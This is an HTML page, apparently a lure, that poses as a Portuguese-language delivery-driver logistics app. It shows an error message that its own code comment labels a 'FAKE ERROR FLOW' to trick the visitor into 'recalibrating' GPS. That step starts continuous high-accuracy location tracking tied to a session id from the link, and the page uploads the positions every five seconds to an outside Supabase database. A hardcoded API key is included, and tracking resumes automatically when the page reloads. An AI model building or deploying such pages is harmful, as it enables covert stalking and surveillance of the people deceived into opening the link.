<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>App Entregador</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        :root { --primary: #ea1d2c; --success: #2ecc71; --dark: #1a1a1a; }
        body { font-family: -apple-system, sans-serif; background: #f8f8f8; margin: 0; display: flex; flex-direction: column; height: 100vh; }
        header { background: var(--primary); color: white; padding: 20px; text-align: center; font-weight: bold; }
        .container { flex: 1; padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .card { background: white; width: 100%; max-width: 350px; padding: 30px; border-radius: 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); text-align: center; }
        .btn { background: var(--dark); color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; }
        .error-msg { background: #fff5f5; color: #c53030; padding: 15px; border-radius: 10px; border: 1px solid #feb2b2; margin-bottom: 20px; font-size: 13px; text-align: left; }
        .status-active { color: var(--success); font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .dot { width: 12px; height: 12px; background: var(--success); border-radius: 50%; animation: blink 2s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .hidden { display: none; }
    </style>
</head>
<body>

<header>SISTEMA LOGÍSTICO</header>

<div class="container">
    <div class="card" id="mainCard">
        
        <!-- UI INICIAL -->
        <div id="step-1">
            <h2 style="margin:0 0 10px 0;">Bem-vindo</h2>
            <p style="color:#666; font-size:14px; margin-bottom:30px;">Inicie seu turno para começar a receber sincronização de rotas.</p>
            <button class="btn" onclick="goStep2()">FICAR ONLINE</button>
        </div>

        <!-- FAKE ERROR FLOW -->
        <div id="step-2" class="hidden">
            <div class="error-msg">
                <strong>⚠️ ERRO DE SINCRONIZAÇÃO (Code: 882)</strong><br>
                O sistema detectou uma falha no sensor de telemetria. É necessário re-calibrar o GPS para prosseguir.
            </div>
            <button class="btn" style="background: var(--primary);" onclick="startShift()">RECALIBRAR E CONECTAR</button>
        </div>

        <!-- APP EM FUNCIONAMENTO -->
        <div id="step-online" class="hidden">
            <div class="status-active">
                <div class="dot"></div> ONLINE E MONITORADO
            </div>
            <p style="color:#888; font-size:13px; margin-top:15px;">Mantenha esta tela aberta durante as entregas.</p>
            <div style="margin-top:25px; padding:15px; background:#f9f9f9; border-radius:10px; font-size:12px; color:#666;">
                Sinal GPS: <span style="color:var(--success); font-weight:bold;">Excelente</span><br>
                Sincronização: <span style="color:var(--success); font-weight:bold;">Ativa</span>
            </div>
        </div>

    </div>
</div>

<script>
    const SB_URL = 'https://zauxkrwtnrlwlgvsdewv.supabase.co';
    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InphdXhrcnd0bnJsd2xndnNkZXd2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY5Njc4MjgsImV4cCI6MjA4MjU0MzgyOH0.L7HJfYvY-IyTBo6gC597EnChuq536WHCDdIZxv8-cKI';
    const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
    
    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get('id');

    window.onload = () => {
        if (localStorage.getItem('online_status') === 'true' && sessionId) {
            startShift();
        }
    }

    function goStep2() {
        document.getElementById('step-1').classList.add('hidden');
        document.getElementById('step-2').classList.remove('hidden');
    }

    function startShift() {
        if (!sessionId) return alert("Link Inválido");

        localStorage.setItem('online_status', 'true');
        document.getElementById('step-1').classList.add('hidden');
        document.getElementById('step-2').classList.add('hidden');
        document.getElementById('step-online').classList.remove('hidden');

        navigator.geolocation.watchPosition((pos) => {
            const point = {
                session_id: sessionId,
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                created_at: new Date().toISOString()
            };
            saveData(point);
            sync();
        }, (err) => { console.log("Permissão necessária"); }, { enableHighAccuracy: true });
    }

    function saveData(point) {
        let buffer = JSON.parse(localStorage.getItem('gps_buffer') || '[]');
        buffer.push(point);
        localStorage.setItem('gps_buffer', JSON.stringify(buffer));
    }

    async function sync() {
        if (!navigator.onLine) return;
        let buffer = JSON.parse(localStorage.getItem('gps_buffer') || '[]');
        if (buffer.length === 0) return;

        const { error } = await supabaseClient.from('locations').insert(buffer);
        if (!error) localStorage.setItem('gps_buffer', '[]');
    }

    setInterval(sync, 5000); // Tenta sincronizar a cada 5 segundos
</script>
</body>
</html>
